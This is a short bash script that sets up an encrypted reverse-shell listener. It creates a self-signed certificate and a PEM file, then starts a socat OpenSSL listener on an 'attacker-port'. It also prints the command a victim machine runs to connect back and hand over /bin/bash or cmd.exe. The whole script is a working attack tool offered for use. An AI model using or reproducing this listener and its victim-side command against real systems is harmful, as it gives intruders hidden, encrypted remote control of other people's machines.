#!/bin/bash

if [ -z "$1" ]
then
	echo "Usage: $0 cert-name pem-name attacker-port"
	exit
fi

echo "[+] - Generating the certificate"
openssl req -newkey rsa:2048 -nodes -keyout $1.key -x509 -days 362 -out $1.crt
sleep 2

echo -e "\n[+] - Generating the PEM File\n"
cat $1.key $1.crt > $2.pem
sleep 2

echo -e "[+] - Executing the SOCAT Reverse Server\n \n[+] - Please run the following command on the victm to get the connection: socat OPENSSL:attackerip:attackerport,verify=0 EXEC:/bin/bash or cmd.exe (windows host)\n"
socat -d -d OPENSSL-LISTEN:$3,cert=$2.pem,verify=0,fork STDOUT
